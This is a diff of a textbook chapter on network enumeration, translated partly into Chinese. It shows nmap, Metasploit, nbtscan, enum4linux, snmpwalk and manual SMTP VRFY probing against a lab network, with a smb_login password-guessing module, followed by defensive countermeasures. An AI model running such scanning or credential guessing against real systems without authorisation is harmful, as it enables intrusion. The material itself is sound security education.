       MAC Address = AC-87-A3-36-D6-AA
 
 ```
 
-使用 `‑B` 参数让 `nmblookup` 使用提供的广播地址，即本地网络的广播地址。若要使用 WINS，可使用 `‑R` 进行递归查找。`‑S` 标志告诉 `nmblookup` 除了名称状态外，还返回节点状态。正是该标志提供了其他用途。正如之前所示，我们可以看到系统既是工作站（<00>），也是文件服务器（<20>）。此外，我们还能看到该系统属于工作组 WORKGROUP。工作组用于临时的 Windows 网络，这里没有域控制器来管理所有系统。
+使用 `‑B` 参数让 `nmblookup` 使用提供的广播地址，即本地网络的广播地址。若要使用 `WINS`，可使用 `‑R` 进行递归查找。`‑S` 标志告诉 `nmblookup` 除了名称状态外，还返回节点状态。正是该标志提供了其他用途。正如之前所示，我们可以看到系统既是工作站（`<00>`），也是文件服务器（`<20>`）。此外，我们还能看到该系统属于工作组 `WORKGROUP`。工作组用于临时的 Windows 网络，这里没有域控制器来管理所有系统。
 
 #### 使用 net 实用程序
 
-Windows 内置的 `net` 实用程序广泛用于多种目的。如果你想连接网络中的共享驱动器，则使用 `net use` 来建立连接。`net` 命令可以通过 SMB 消息查询网络。下面的示例展示了 Windows 服务器上工作站服务的统计信息，主要包括网络通信数据，如传输字节数，以及已启动和失败的会话数量。
-
-
-
+Windows 内置的 `net` 实用程序广泛用于多种目的。如果你想连接网络中的共享驱动器，则使用 `net use` 来建立连接。`net` 命令可以通过 `SMB` 消息查询网络。下面的示例展示了 Windows 服务器上工作站服务的统计信息，主要包括网络通信数据，如传输字节数，以及已启动和失败的会话数量。
 
 ```
 $ sudo nmap --script smb-os-discovery 192.168.1.10
+
 Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-12 13:51 EST
-  
+
 Nmap scan report for stevedallas.lan (192.168.86.50)
+
 Host is up (0.00058s latency).
-  
+
 PORT    STATE SERVICE
+
 135/tcp open  msrpc
+
 139/tcp open  netbios-ssn
+
 445/tcp open  microsoft-ds
+
 MAC Address: 46:5E:C8:0A:B7:D1 (Unknown)
-  
+
 Host script results:
+
 | smb-os-discovery:
+
 |   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
+
 |   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
+
 |   Computer name: stevedallas
+
 |   NetBIOS computer name: STEVEDALLAS\x00
+
 |   Workgroup: WORKGROUP\x00
+
 |_  System time: 2021-01-04T20:30:27-06:00
+
 ```
+
 ```
 $ sudo nmap --script smb-enum-shares 192.168.1.10
+
 Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-12 13:53 EST
-  
+
 Nmap scan report for stevedallas.lan (192.168.86.50)
+
 Host is up (0.00040s latency).
-  
+
 PORT    STATE SERVICE
+
 135/tcp open  msrpc
+
 139/tcp open  netbios-ssn
+
 445/tcp open  microsoft-ds
+
 MAC Address: 46:5E:C8:0A:B7:D1 (Unknown)
-  
+
 Host script results:
+
 | smb-enum-shares:
+
 |   note: ERROR: Enumerating shares failed, guessing at common ones
+
 (NT_STATUS_ACCESS_DENIED)
+
 |   account_used: <blank>
+
 |   \\192.168.86.50\ADMIN$:
+
 |     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
+
 |     Anonymous access: <none>
+
 |   \\192.168.86.50\C$:
+
 |     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
+
 |     Anonymous access: <none>
+
 |   \\192.168.86.50\IPC$:
+
 |     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
+
 |     Anonymous access: READ
+
 |   \\192.168.86.50\USERS:
+
 |     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
+
 |_    Anonymous access: <none>
+
 ```
+
 One of the common share names tried is `IPC$`. This is a share name allowing access to shared pipes, which is a method for interprocess communications. Another share name `nmap` checked for is `C$`. This is an administrative share that is created. Again, older versions of Windows will allow easier access to this share, but since Windows XP, there have been more restrictions on the use of this share. It does enable administrators to function remotely, but accessing it requires more than just login credentials. The login credentials have to be for an administrator.
 
-While `nmap` does have other scripts that can be used against systems running SMB, most of them are not for enumeration. Many of them are specific to vulnerability identification or confirmation. Since we are focusing on enumeration, we can put off looking at those other 
+While `nmap` does have other scripts that can be used against systems running `SMB`, most of them are not for enumeration. Many of them are specific to vulnerability identification or confirmation. Since we are focusing on enumeration, we can put off looking at those other
+
+Windows XP 系统运行的是 `SMB` 版本 `1`，因为版本 `2` 直到 Windows Vista 推出后才出现。根据 `SMB` 版本历史，Windows 7 系统会使用 `SMB` 版本 `2.1`。虽然这看起来像是一个过时的扫描，但拥有旧系统对于练习攻击很有用，因为它们更有可能包含软件的弱版本。
+
+#### SMB 版本扫描与 Metasploit
 
 
-
-Windows XP 系统运行的是 SMB 版本 1，因为版本 2 直到 Windows Vista 推出后才出现。根据 SMB 版本历史，Windows 7 系统会使用 SMB 版本 2.1。虽然这看起来像是一个过时的扫描，但拥有旧系统对于练习攻击很有用，因为它们更有可能包含软件的弱版本。
-
-`SMB 版本扫描与 Metasploit`
 
 ```
 msf auxiliary(scanner/smb/smb_version)> run
-  
+
  [*] Scanned 26 of 256 hosts (10% complete)
+
  [*] 192.168.86.26:445 - Host could not be identified: ()
+
  [*] 192.168.86.27:445 - Host could not be identified: ()
+
  [*] 192.168.86.32:445 - Host could not be identified: ()
+
  [*] 192.168.86.41:445 - Host could not be identified: ()
+
  [+] 192.168.86.49:445 - Host is running Windows XP SP2 (language:English) (name:OPUS-C765F2) (workgroup:WORKGROUP )
+
  [+] 192.168.86.50:445 - Host is running Windows 7 Professional SP1 (build:7601) (name:STEVEDALLAS) (workgroup:WORKGROUP )
+
  [*] Scanned 52 of 256 hosts (20% complete)
+
  [*] 192.168.86.61:445 - Host could not be identified: ()
- 
 ```
 
 我们也可以使用 Metasploit 来枚举用户。为此，需要使用 `smb_enumusers_domain` 模块。如果你知道一个用户，可以使用用户名和密码。这将让模块能够对系统进行身份验证以获取更多用户。虽然这不是必须的，但如果没有某种形式的身份验证，获得用户列表的可能性会大大降低。幸运的是，还有一个模块可以帮助你至少获取一个用户名和密码。`smb_login` 模块可以用来尝试用户名/密码组合。下面是 `smb_login` 模块的选项列表。
 
-`smb_login 模块选项`
+**`smb_login` 模块选项**
 
 ```
  Module options (auxiliary/scanner/smb/smb_login):
-  
+
             Name               Current Setting  Required  Description
+
             ----               ---------------  --------  -----------
+
     ABORT_ON_LOCKOUT   false            yes       Abort the run when an account lockout is detected
+
     BLANK_PASSWORDS    false            no        Try blank passwords for all users
+
     BRUTEFORCE_SPEED   5                yes       How fast to bruteforce, from 0 to 5
+
     DB_ALL_CREDS       false            no        Try each user/password couple stored in the current database
+
     DB_ALL_PASS        false            no        Add all passwords in the current database to the list
+
     DB_ALL_USERS       false            no        Add all users in the current database to the list
+
     DETECT_ANY_AUTH    false            no        Enable detection of systems accepting any authentication
+
     DETECT_ANY_DOMAIN  false            no        Detect if domain is required for the specified user
+
     PASS_FILE                           no        File containing passwords, one per line
+
     PRESERVE_DOMAINS   true             no        Respect a username that contains a domain name.
+
     Proxies                             no        A proxy chain of format type:host:port[,type:host:port][…]
+
     RECORD_GUEST       false            no        Record guest-privileged random logins to the database
+
     RHOSTS                              yes       The target address range or CIDR identifier
+
     RPORT              445              yes       The SMB service port (TCP)
+
     SMBDomain          .                no        The Windows domain to use for authentication
+
     SMBPass                             no        The password for the specified username
+
     SMBUser                             no        The username to authenticate as
+
     STOP_ON_SUCCESS    false            yes       Stop guessing when a credential works for a host
+
     THREADS            1                yes       The number of concurrent threads
+
     USERPASS_FILE                       no        File containing users and passwords separated by space, one pair per line
+
     USER_AS_PASS       false            no        Try the username as the password for all users
+
     USER_FILE                           no        File containing usernames, one per line
+
     VERBOSE            true             yes       Whether to print output for all attempts
- 
 ```
 
 使用 `smb_login` 模块，你可以提供包含用户名和密码的文件。模块会尝试使用用户名和密码组合进行身份验证。你还会看到可以让模块尝试将用户名作为密码。这在密码策略中通常被禁止，但如果你遇到没有密码策略的系统，则可以实现用户名和密码相同的情况。
@@ -5451,73 +6131,113 @@ msf auxiliary(scanner/smb/smb_version)> run
 
 ```
 msf6> use auxiliary/scanner/smb/smb_enumshares
+
 msf6 auxiliary(scanner/smb/smb_enumshares)> show options
- 
+
 Module options (auxiliary/scanner/smb/smb_enumshares):
- 
+
    Name               Current Setting    Required  Description
+
    ----               ---------------    --------  -----------
+
    HIGHLIGHT_NAME_PA  username|password  yes       PCRE regex of resource name
+
    TTERN              |user|pass|Groups            s to highlight
+
                       .xml
+
    LogSpider          3                  no        0 = disabled, 1 = CSV, 2 =
+
                                                    table (txt), 3 = one liner
+
                                                    (txt) (Accepted: 0, 1, 2, 3
+
                                                    )
+
    MaxDepth           999                yes       Max number of subdirectorie
+
                                                    s to spider
+
    RHOSTS                                yes       The target host(s), see htt
+
                                                    ps://github.com/rapid7/meta
+
                                                    sploit-framework/wiki/Using
+
                                                    -Metasploit
+
    SMBDomain          .                  no        The Windows domain to use f
+
                                                    or authentication
+
    SMBPass                               no        The password for the specif
+
                                                    ied username
+
    SMBUser                               no        The username to authenticat
+
                                                    e as
+
    Share                                 no        Show only the specified sha
+
                                                    re
+
    ShowFiles          false              yes       Show detailed information w
+
                                                    hen spidering
+
    SpiderProfiles     true               no        Spider only user profiles w
+
                                                    hen share is a disk share
+
    SpiderShares       false              no        Spider shares recursively
+
    THREADS            1                  yes       The number of concurrent th
+
                                                    reads (max one per host)
- 
 ```
 
 与 `nmap` 类似，Metasploit 还有多个模块可用于针对 SMB 系统进行扫描。其中许多与识别漏洞相关。它还提供了另一个工具，你可以用来收集信息，使用 Metasploit 的优势在于它配备了一个数据库，用于存储信息，使其成为一个良好的记录保存工具，同时也可用于枚举和其他形式的扫描。
 
 ### 其他实用工具
 
-
-
-
 Considering the number of devices that use SMB for networking, it's not surprising that there are many tools available for enumerating SMB systems. The program `nbtscan` is one of those. It provides details about systems it finds on the local network, including the NetBIOS name, user, MAC address, and IP address. In the following listing, you can see the output of scanning my home network, identifying every system that has Windows shares available. The scan range has been provided on the command line here, but you can also provide the IP addresses in a file.
 
-**Scanning a Network with nbtscan**
+#### Scanning a Network with `nbtscan`
 
 ```
 root@quiche:~# nbtscan 192.168.86.0/24
+
 Doing NBT name scan for addresses from 192.168.86.0/24
 
 IP address       NetBIOS Name     Server    User             MAC address
-----------------------------------------------------------------------
-192.168.86.0Sendto failed: Permission denied
-192.168.86.44    NPI110654                  <unknown>        00:00:00:00:00:00
-192.168.86.52    BOBBIE           <server>  BOBBIE           00:00:00:00:00:00
-192.168.86.49    OPUS-C765F2  <server>  <unknown>        00:50:56:3b:ac:3e
-192.168.86.170   MILOBLOOM        <server>  <unknown>        ac:87:a3:1e:6b:30
-192.168.86.50    STEVEDALLAS      <server>  <unknown>        46:5e:c8:0a:b7:d1
-192.168.86.26    YAZPISTACHIO     <server>  <unknown>        f0:18:98:0c:34:69
-192.168.86.61    MILOBLOOM        <server>  <unknown>        ac:87:a3:1e:6b:30
-192.168.86.32    BILLTHECAT       <server>  <unknown>        ac:87:a3:36:d6:aa
-192.168.86.27    BINKLEY          <server>  <unknown>        8c:85:90:5a:7e:f2
-192.168.86.255   Sendto failed: Permission denied
 
+----------------------------------------------------------------------
+
+192.168.86.0Sendto failed: Permission denied
+
+192.168.86.44    NPI110654                  <unknown>        00:00:00:00:00:00
+
+192.168.86.52    BOBBIE           <server>  BOBBIE           00:00:00:00:00:00
+
+192.168.86.49    OPUS-C765F2  <server>  <unknown>        00:50:56:3b:ac:3e
+
+192.168.86.170   MILOBLOOM        <server>  <unknown>        ac:87:a3:1e:6b:30
+
+192.168.86.50    STEVEDALLAS      <server>  <unknown>        46:5e:c8:0a:b7:d1
+
+192.168.86.26    YAZPISTACHIO     <server>  <unknown>        f0:18:98:0c:34:69
+
+192.168.86.61    MILOBLOOM        <server>  <unknown>        ac:87:a3:1e:6b:30
+
+192.168.86.32    BILLTHECAT       <server>  <unknown>        ac:87:a3:36:d6:aa
+
+192.168.86.27    BINKLEY          <server>  <unknown>        8c:85:90:5a:7e:f2
+
+192.168.86.255   Sendto failed: Permission denied
 ```
+
+
 
 Getting the output here, just as with any tool, is helpful, but at some point you need to do something with the information, not least putting it into a report for your client or employer. One nice thing about `nbtscan` is the ability to generate output that can be manipulated programmatically. This may include taking the output and putting it into a database. While you can certainly read in values with white‑space separators, `nbtscan` lets you specify a separator that may make it easier to read in the output, but you can also specify a comma as a separator and then open the output in a spreadsheet program. Adding `‑s` followed by whatever character you want to use as a separator will get you the same output as shown earlier, just with your specified separator included between the different fields.
 
@@ -5525,74 +6245,100 @@ You may start to see a bit of a pattern when it comes to enumeration and SMB. Wh
 
 Another tool, and we'll see the same capabilities with this one, is `enum4linux`. The following example is being run from a Kali Linux system where it is installed by default, but it's easy enough to get a copy of it. It's just a Perl script, so to run it, you need a Perl interpreter. The following example enumerates the shares on a specific host, identified by IP address. The target system is a Linux system running Samba to provide Windows networking functionality over SMB. In the output, you will find a lot of information related to how Samba is configured. As an example, we can see that the workgroup WORKGROUP is configured, which is a way of organizing systems on a local network that are all using Windows.
 
-**enum4linux Share Enumeration**
+### enum4linux Share Enumeration
 
 ```
 root@quiche:~# enum4linux  -S 192.168.86.52
+
 Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sun Jan 3 12:18:25 2021
 
 ==========================
+
 |    Target Information    |
+
 ==========================
+
 Target …….. 192.168.86.52
+
 RID Range …….. 500-550,1000-1050
+
 Username ……… ''
+
 Password ……… ''
+
 Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
 
 [+] Got domain/workgroup name: WORKGROUP
 
 ===================================================
+
 |    Session Check on 192.168.86.52    |
+
 =====================================
+
 [+] Server 192.168.86.52 allows sessions using username '', password ''
 
 ========================================
+
 |    Getting domain SID for 192.168.86.52    |
+
 =========================================
+
 Domain Name: WASHERE
+
 Domain Sid: (NULL SID)
+
 [+] Can't determine if host is part of domain or part of a workgroup
 
 ========================================
+
 |    Share Enumeration on 192.168.86.52    |
+
 ========================================
+
 WARNING: The "syslog" option is deprecated
 
      Sharename       Type      Comment
+
      ---------       ----      -------
+
      homes           Disk      Home Directories
+
      print$          Disk      Printer Drivers
+
      IPC$            IPC       Service (bobbie server (Samba, Ubuntu))
+
  Reconnecting with SMB1 for workgroup listing.
 
      Server               Comment
+
      ---------            -------
+
      Workgroup            Master
+
      ---------            -------
+
      WORKGROUP            STEVEDALLAS
 
 [+] Attempting to map shares on 192.168.86.52
- 
+
 ```
 
 At the bottom, you can see the different share names. This includes the `IPC$`, which is used for interprocess communication between hosts. This allows for management of systems remotely. Using `enum4linux`, we can finally see the master browser on the network. The system named `STEVEDALLAS` holds the current authoritative list of all the systems on the network. This is a system that has been elected by other systems on the network, which essentially means it has volunteered, and based on its characteristics, no one else has challenged it. The reason for `STEVEDALLAS` to be the master browser is it is one of only a couple of Windows systems, and of the two or three that were actual Windows systems and not Linux or macOS running SMB services, `STEVEDALLAS` has the most recent operating system.
 
 Using SMB‑related utilities, we can gather a lot of information from the target network. As noted earlier, it's generally necessary to be on the local network to be able to use any of these tools. One reason for this can be the broadcast domain orientation of Windows networking—announcements on the local network. Another is that Windows networking ports are commonly blocked by firewalls. Also, it's entirely possible that desktop networks, where the systems are most likely to be communicating with SMB, often use private addresses that may not be exposed to the outside world. To get to them, because they are nonroutable by convention, you'd have to be on a network where there would at least be routing rules to get to those target networks, meaning there is network reachability.
 
-
-
 -   [禁用 SMBv1] SMBv1 是一个较旧的协议，除非在非常特殊的情况下不需要它。它易受多种攻击，可能导致信息泄露。这很容易禁用，事实上，较新的 Windows 版本默认已禁用它。
 
--   **`Enable Host‑Based Firewall`** 使用分区可以在不受信任网络上保护单个系统。主机防火墙还可以设置规则，限制谁可以通过 SMB 与单个系统通信。大多数情况下，你不需要允许从工作站发起的 SMB 通信，除非是特定的基础设施系统。
+-   `Enable Host‑Based Firewall` 使用分区可以在不受信任网络上保护单个系统。主机防火墙还可以设置规则，限制谁可以通过 SMB 与单个系统通信。大多数情况下，你不需要允许从工作站发起的 SMB 通信，除非是特定的基础设施系统。
 
     `Host‑based firewalls` 可以让你设置规则，限制谁可以向工作站发起 SMB 通信。对 Windows 服务器也可能适用。你应知道哪些基础设施系统应允许入站请求，以及应从哪些系统允许。
 
--   **`Network Firewalls`** 主机防火墙保护单个系统，但你可以在网络段之间启用网络防火墙，仅允许从预期的基础设施系统发起的 SMB 流量，从而在源头拦截大量流量。
+-   `Network Firewalls` 主机防火墙保护单个系统，但你可以在网络段之间启用网络防火墙，仅允许从预期的基础设施系统发起的 SMB 流量，从而在源头拦截大量流量。
 
--   **`Disable Sharing`** 在企业网络中，通常不应允许工作站进行共享。更好的做法是将共享放在服务器上，集中管理，让用户从文件服务器共享文件。禁用共享会自动减少外部可获得的信息量。
+-   `Disable Sharing` 在企业网络中，通常不应允许工作站进行共享。更好的做法是将共享放在服务器上，集中管理，让用户从文件服务器共享文件。禁用共享会自动减少外部可获得的信息量。
 
--   **`Disable NetBIOS over TCP/IP`** 这不是大多数 Windows 网络功能所必需的协议。可以禁用它，从而防止通过 TCP/IP 堆栈进行 NetBIOS 探测。
+-   `Disable NetBIOS over TCP/IP` 这不是大多数 Windows 网络功能所必需的协议。可以禁用它，从而防止通过 TCP/IP 堆栈进行 NetBIOS 探测。
 
 ### 简单网络管理协议
 
@@ -5606,10 +6352,15 @@ Using SMB‑related utilities, we can gather a lot of information from the targe
 
 SNMP 可提供大量有用信息，前提是已在代理上正确安装并运行相应的 MIB。这包括系统名称、运行的内核版本等。下面的示例展示了使用 `snmpwalk` 程序“遍历” MIB 树以获取代理数据的过程。它从树的顶层开始，收集所有可得信息。`snmpwalk` 的输出中可以看到系统名称以及内核标识，还有一些在 SNMP 代理中配置的联系信息。输出中使用 `‑v 2c` 指定版本，使用 `‑c` 参数指定公共字符串，这里的字符串是 `‘public’`。
 
-**`snmpwalk` of Linux System**
+#### `snmpwalk` of Linux System
 
 ```
-```root@quiche:~# snmpwalk -v 2c -c public 192.168.86.52
+```
+
+
+
+```text
+root@quiche:~# snmpwalk -v 2c -c public 192.168.86.52
 iso.3.6.1.2.1.1.1.0 = STRING: "Linux bobbie 4.15.0-30-generic #32-Ubuntu SMP Sun Jan 4 17:42:43 UTC 2021 x86_64"
 iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
 iso.3.6.1.2.1.1.3.0 = Timeticks: (7606508) 21:07:45.08
@@ -5629,150 +6380,168 @@ iso.3.6.1.2.1.1.9.1.2.8 = OID: iso.3.6.1.2.1.50
 iso.3.6.1.2.1.1.9.1.2.9 = OID: iso.3.6.1.6.3.13.3.1.3
 iso.3.6.1.2.1.1.9.1.2.10 = OID: iso.3.6.1.2.1.92
 ```
-```
 
 通过抓取诸如 `ifTable`（接口表）等 MIB，你可以得到系统上所有接口的列表及其配置。在分层网络设计中，这有助于了解系统可能连接的其他网络，从而继续完善你正在构建的网络图。
-
-
-
 
 一个 SNMP 的优势是它最常用于网络设备（如路由器和交换机）。这些设备可能没有传统的访问方式，也没有传统的用户概念，使用 SNMP 来获取这些设备的信息可以是一个很好的入口点。正如往常一样，SNMP 协议通常会被防火墙禁用。换句话说，你通常需要先通过防火墙或访问控制列表获得对网络设备的特定访问权限，才能开始请求网络设备的 MIB 数据。正确实现和配置的 SNMP 代理不应向任何请求它的人员提供敏感的系统信息。
 
 ### Countermeasures
 
-针对 SNMP 的最简单的对策就是直接禁用它。但这取决于网络的管理方式，可能并不总是可行。除此之外，务必升级到 SNMPv3，因为 SNMPv1 已经被多年弃用，它不仅容易受到攻击，而且无法加密数据，所有信息都是明文的。SNMPv1 的认证机制也很弱，依赖于 community 字符串，而实现往往使用众所周知的字符串。保护 SNMP 实现的措施如下：
-
-*   **Upgrade to SNMPv3** 移除 SNMPv1 和 SNMPv2。
-
-*   **Require Authentication** 禁用仅使用 community 字符串进行认证的做法。
-
-*   **Require Encryption** 确保所有 SNMP 通信都经过加密。
-
-*   **Use Firewalls** 结合网络层和主机层防火墙，确保只有授权的主机之间进行通信。SNMP 不应在未受限制的网络中随意使用。
+* **Upgrade to SNMPv3** 移除 SNMPv1 和 SNMPv2。
+* **Require Authentication** 禁用仅使用 community 字符串进行认证的做法。
+* **Require Encryption** 确保所有 SNMP 通信都经过加密。
+* **Use Firewalls** 结合网络层和主机层防火墙，确保只有授权的主机之间进行通信。SNMP 不应在未受限制的网络中随意使用。
 
 ## Simple Mail Transfer Protocol
 
 与许多其他协议一样，SMTP 使用一系列动词（verbs）与服务器交互。客户端发送一个动词以及必要的参数给 SMTP 服务器。根据动词的不同，服务器知道如何处理收到的参数。与其他更简单的协议不同，SMTP 的交互是一整套对话。在开始之前，你必须先向服务器问候，这告诉服务器你将使用何种 SMTP 版本。随后，你告知服务器你想执行的操作。根据你要完成的功能，可能需要提供额外的信息，例如提供凭证。下面给出一个简短的 SMTP 对话示例，这是纯手动的，你可以看到在协议层面的交流以及如何与 SMTP 服务器交互。如果你连接的不是本地服务器或 SMTP 服务器未认识的用户，可能会收到错误。
 
-**SMTP Conversation**
+### SMTP Conversation
 
-```
- root@quiche:~# nc 192.168.86.52 25
- 220 bobbie.lan ESMTP Postfix (Ubuntu)
- EHLO blah.com
- 250-bobbie.lan
- 250-PIPELINING
- 250-SIZE 10240000
- 250-VRFY
- 250-ETRN
- 250-STARTTLS
- 250-ENHANCEDSTATUSCODES
- 250-8BITMIME
- 250-DSN
- 250 SMTPUTF8
- MAIL From: foo@foo.com
- 250 2.1.0 Ok
- RCPT To: wubble@wubble.com
- 250 2.1.5 Ok
- DATA
- 354 End data with <CR><LF>.<CR><LF>
- From: Goober
- To: Someone
- Date: today
- Subject: Hi
- 
- Nothing really to say.
- 
- .
- 250 2.0.0 Ok: queued as 33471301389
- 
+```text
+root@quiche:~# nc 192.168.86.52 25
+
+220 bobbie.lan ESMTP Postfix (Ubuntu)
+
+EHLO blah.com
+
+250-bobbie.lan
+
+250-PIPELINING
+
+250-SIZE 10240000
+
+250-VRFY
+
+250-ETRN
+
+250-STARTTLS
+
+250-ENHANCEDSTATUSCODES
+
+250-8BITMIME
+
+250-DSN
+
+250 SMTPUTF8
+
+MAIL From: foo@foo.com
+
+250 2.1.0 Ok
+
+RCPT To: wubble@wubble.com
+
+250 2.1.5 Ok
+
+DATA
+
+354 End data with <CR><LF>.<CR><LF>
+
+From: Goober
+
+To: Someone
+
+Date: today
+
+Subject: Hi
+
+Nothing really to say.
+
+.
+
+250 2.0.0 Ok: queued as 33471301389
 ```
 
 发起对话时使用 `HELO` 或 `EHLO`，服务器会返回它所支持的功能列表。SMTP 协议中有几个功能可以用于枚举用户或至少电子邮件地址。其中之一是 `VRFY`，用于验证用户。并非所有邮件服务器都开启此功能，因为它可以用来识别合法用户或邮箱地址，进而被攻击者或垃圾邮件发送者利用。下面是一个在默认开启 `VRFY` 的本地 Postfix 服务器上的 `VRFY` 示例。
 
-**Testing VRFY**
+### Testing `VRFY`
 
-```
- root@quiche:~# nc 192.168.86.52 25
- 220 bobbie.lan ESMTP Postfix (Ubuntu)
- EHLO blah.com
- 250-bobbie.lan
- 250-PIPELINING
- 250-SIZE 10240000
- 250-VRFY
- 250-ETRN
- 250-STARTTLS
- 250-ENHANCEDSTATUSCODES
- 250-8BITMIME
- 250-DSN
- 250 SMTPUTF8
- VRFY root@localhost
- 252 2.0.0 root@localhost
- VRFY kilroy@localhost
- 252 2.0.0 kilroy@localhost
- VRFY root
- 252 2.0.0 root
- 
+```text
+root@quiche:~# nc 192.168.86.52 25
+
+220 bobbie.lan ESMTP Postfix (Ubuntu)
+
+EHLO blah.com
+
+250-bobbie.lan
+
+250-PIPELINING
+
+250-SIZE 10240000
+
+250-VRFY
+
+250-ETRN
+
+250-STARTTLS
+
+250-ENHANCEDSTATUSCODES
+
+250-8BITMIME
+
+250-DSN
+
+250 SMTPUTF8
+
+VRFY root@localhost
+
+252 2.0.0 root@localhost
+
+VRFY kilroy@localhost
+
+252 2.0.0 kilroy@localhost
+
+VRFY root
+
+252 2.0.0 root
 ```
 
 我们只收到状态码，没有具体的服务器反馈信息。252 表示地址无法验证，但服务器仍会尝试投递。即使 `VRFY` 已启用，也并未提供太多有用信息，手动遍历非常耗时。
 
-可以手动完成，但 Metasploit 再次派上用场。`smtp_enum` 模块会读取字典文件并自动执行前面手动演示的过程。它提供了两种方式来判断用户是否存在 —  — 使用 `VRFY` 命令或 `MAIL TO` 命令。下面的列表展示了同一服务器的一次运行结果，使用的是 Metasploit 自带的默认字典 `unix_users.txt`（包含常见的 Unix 用户名）。
+可以手动完成，但 Metasploit 再次派上用场。`smtp_enum` 模块会读取字典文件并自动执行前面手动演示的过程。它提供了两种方式来判断用户是否存在——使用 `VRFY` 命令或 `MAIL TO` 命令。下面的列表展示了同一服务器的一次运行结果，使用的是 Metasploit 自带的默认字典 `unix_users.txt`（包含常见的 Unix 用户名）。
 
-**smtp_enum Run**
+### `smtp_enum` Run
 
-```
- msf auxiliary(scanner/smtp/smtp_enum)> use auxiliary/scanner/smtp/smtp_enum
- msf auxiliary(scanner/smtp/smtp_enum)> show options
-  
- Module options (auxiliary/scanner/smtp/smtp_enum):
-  
-     Name       Current Setting       Required  Description
-     ----       ---------------       --------  -----------
-     RHOSTS                           yes       The target host(s), see https://
-                                               github.com/rapid7/metasploit-fra
-                                               mework/wiki/Using-Metasploit
-     RPORT      25                    yes       The target port (TCP)
-     THREADS    1                     yes       The number of concurrent threads
-                                               (max one per host)
-     UNIXONLY   true                  yes       Skip Microsoft bannered servers
-                                               when testing unix users
-     USER_FILE  /usr/share/metasploit-framework/data/wor
-               tlists/unix_users.txt
-  
-  
- View the full module info with the info, or info -d command.
-  
- msf auxiliary(scanner/smtp/smtp_enum)> set RHOSTS 192.168.86.52/32
- RHOSTS => 192.168.86.52/32
- msf auxiliary(scanner/smtp/smtp_enum)> run
-  
- [*] 192.168.86.52:25 - 192.168.86.52:25 Banner: 220 bobbie.lan ESMTP Postfix (Ubuntu)
- [+] 192.168.86.52:25 - 192.168.86.52:25 Users found:, backup, bin, daemon, games, gnats, irc, list, lp, mail, man, messagebus, news, nobody, postmaster, proxy, sshd, sync, sys, syslog, uucp, www-data
- [*] Scanned 1 of 1 hosts (100% complete)
- [*] Auxiliary module execution completed
- 
+```text
+msf auxiliary(scanner/smtp/smtp_enum)> use auxiliary/scanner/smtp/smtp_enum
+msf auxiliary(scanner/smtp/smtp_enum)> show options
+Module options (auxiliary/scanner/smtp/smtp_enum):
+
+    Name       Current Setting       Required  Description
+    ----       ---------------       --------  -----------
+    RHOSTS                           yes       The target host(s), see https://
+                                              github.com/rapid7/metasploit-fra
+                                              mework/wiki/Using-Metasploit
+    RPORT      25                    yes       The target port (TCP)
+    THREADS    1                     yes       The number of concurrent threads
+                                              (max one per host)
+    UNIXONLY   true                  yes       Skip Microsoft bannered servers
+                                              when testing unix users
+    USER_FILE  /usr/share/metasploit-framework/data/wor
+              tlists/unix_users.txt
+
+View the full module info with the info, or info -d command.
+
+msf auxiliary(scanner/smtp/smtp_enum)> set RHOSTS 192.168.86.52/32
+RHOSTS => 192.168.86.52/32
+msf auxiliary(scanner/smtp/smtp_enum)> run
+[*] 192.168.86.52:25 - 192.168.86.52:25 Banner: 220 bobbie.lan ESMTP Postfix (Ubuntu)
+[+] 192.168.86.52:25 - 192.168.86.52:25 Users found:, backup, bin, daemon, games, gnats, irc, list, lp, mail, man, messagebus, news, nobody, postmaster, proxy, sshd, sync, sys, syslog, uucp, www-data
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
 ```
 
-可以看到该模块发现了许多用户。由于 `VRFY` 返回 252 而用户确实存在，说明模块并未使用 `VRFY`，而是使用了 `MAIL TO` 命令。不存在的用户会返回 550 状态码，存在的用户则返回 250。基于此，模块只返回了有效用户名 —  — 在 112 个用户中，仅有 21 个被确认存在。 
-
-
+可以看到该模块发现了许多用户。由于 `VRFY` 返回 252 而用户确实存在，说明模块并未使用 `VRFY`，而是使用了 `MAIL TO` 命令。不存在的用户会返回 550 状态码，存在的用户则返回 250。基于此，模块只返回了有效用户名——在 112 个用户中，仅有 21 个被确认存在。
 
 还有一个可以在 SMTP 服务器上使用的命令，虽然它是针对邮件列表的。如果你找到一个属于某个域的邮件列表地址，你可能会使用 `EXPN` 来展开该列表，这意味着识别该列表中的电子邮件地址。此功能要求服务器支持增强 SMTP（ESMTP）。你可以通过检查服务器是否接受 `EHLO`（ESMTP 版本的 `HELO`）来测试服务器是否支持 ESMTP。
 
 ### 反制措施
 
-针对 SMTP 列举的反制措施，我们主要关注防止通过探测邮件服务器来识别用户。鉴于用户名列表的普遍性，这种防护可能用处有限，但仍值得加入任何能让攻击者更困难的措施。
-
-*   **禁用 VRFY**   一些 SMTP 服务器允许禁用此命令。将其从你的邮件服务器中移除，通常不会影响邮件投递所需的任何功能。
-
-*   **忽略未知地址**   让你的 SMTP 服务器忽略未知的用户名/电子邮件地址。返回错误会向攻击者提供用户是否存在的信息。
-
-*   **限制 Header 中的信息**   确保你不会向攻击者泄露内部电子邮件链的信息。这会向攻击者透露内部系统以及环境中的其他 SMTP 服务器。
-
-*   **禁用公开中继**   虽然这比以前少见，但确保你环境中的所有系统都不允许向其他域中继，有助于防止利用这些系统对其他域进行列举，因为许多终端用户网络（如有线网络）只允许发送给其提供商的电子邮件地址。
-
-*   **实施邮件安全**   虽然这些做法可能不完全防止列举，但越来越多的企业实施诸如 Sender Policy Framework（SPF）和 DomainKeys Identified Mail（DKIM）等措施，能更好地限制谁可以发送邮件，从而也能限制对邮件服务器的探测。
